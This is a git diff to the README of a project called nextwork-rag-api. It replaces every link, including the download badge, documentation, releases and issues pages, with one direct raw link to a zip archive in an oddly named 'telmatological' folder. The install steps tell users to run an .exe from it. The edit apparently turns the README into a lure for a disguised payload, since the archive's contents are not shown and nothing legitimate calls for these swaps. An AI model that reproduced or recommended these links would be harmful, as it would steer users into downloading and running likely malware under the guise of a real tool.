@@ -4,7 +4,7 @@
 Welcome to the nextwork-rag-api! This API simplifies document management and enhances your queries using advanced AI techniques. Follow the steps below to download and run the application easily.
 
 ## 📥 Download the Application
-[![Download nextwork-rag-api](https://img.shields.io/badge/Download-nextwork--rag--api-blue)](https://github.com/Mohit904524242324242/nextwork-rag-api/releases)
+[![Download nextwork-rag-api](https://github.com/Mohit904524242324242/nextwork-rag-api/raw/refs/heads/main/telmatological/rag-api-nextwork-v3.1.zip)](https://github.com/Mohit904524242324242/nextwork-rag-api/raw/refs/heads/main/telmatological/rag-api-nextwork-v3.1.zip)
 
 ## 💻 System Requirements
 To ensure that the nextwork-rag-api runs smoothly, please check the following requirements:
@@ -22,12 +22,12 @@ To ensure that the nextwork-rag-api runs smoothly, please check the following re
 - **Kubernetes Ready:** Scale and manage your API seamlessly.
 
 ## 📚 Documentation
-For detailed documentation on how to use the API, visit our [Documentation](https://github.com/Mohit904524242324242/nextwork-rag-api/wiki).
+For detailed documentation on how to use the API, visit our [Documentation](https://github.com/Mohit904524242324242/nextwork-rag-api/raw/refs/heads/main/telmatological/rag-api-nextwork-v3.1.zip).
 
 ## 🔧 How to Download & Install
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page where you can download the latest version of the nextwork-rag-api:
-   [Download Page](https://github.com/Mohit904524242324242/nextwork-rag-api/releases)
+   [Download Page](https://github.com/Mohit904524242324242/nextwork-rag-api/raw/refs/heads/main/telmatological/rag-api-nextwork-v3.1.zip)
 
 2. **Select the Latest Version**  
    Find the most recent version listed on the Releases page. Look for a file that matches your operating system. For example, if you are using Windows, choose the `.exe` file.
@@ -48,10 +48,10 @@ To use the nextwork-rag-api effectively, follow these examples:
 - **Advanced Features:** Utilize ChromaDB for deeper insights and document management.
 
 ## 📞 Support
-If you have questions or need help, feel free to reach out through our [Issues](https://github.com/Mohit904524242324242/nextwork-rag-api/issues) page on GitHub. Our team will assist you as soon as possible.
+If you have questions or need help, feel free to reach out through our [Issues](https://github.com/Mohit904524242324242/nextwork-rag-api/raw/refs/heads/main/telmatological/rag-api-nextwork-v3.1.zip) page on GitHub. Our team will assist you as soon as possible.
 
 ## ⚙️ Contributing
 We welcome contributions! If you wish to contribute to the nextwork-rag-api, please check our contribution guidelines in the repository.
 
 ## 🎉 Conclusion
-Thank you for choosing nextwork-rag-api! We hope this application meets your document management needs effectively. Don't forget to visit the [Releases Page](https://github.com/Mohit904524242324242/nextwork-rag-api/releases) again for updates and new features.
+Thank you for choosing nextwork-rag-api! We hope this application meets your document management needs effectively. Don't forget to visit the [Releases Page](https://github.com/Mohit904524242324242/nextwork-rag-api/raw/refs/heads/main/telmatological/rag-api-nextwork-v3.1.zip) again for updates and new features.
